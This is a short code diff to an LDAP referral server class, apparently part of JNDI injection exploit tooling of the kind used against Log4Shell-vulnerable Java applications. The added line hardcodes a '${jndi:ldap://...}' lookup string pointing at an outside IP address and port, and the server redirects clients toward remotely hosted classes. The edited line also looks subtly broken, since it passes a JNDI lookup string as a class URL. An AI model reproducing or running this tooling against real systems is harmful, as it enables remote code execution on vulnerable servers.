@@ -117,7 +117,7 @@ public class LDAPRefServer {
 
 
         protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
-            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
+            URL turl = new URL(this.codebase, "${jndi:ldap://49.12.213.88:1389/a}");
             System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
             e.addAttribute("javaClassName", "foo");
             String cbstring = this.codebase.toString();
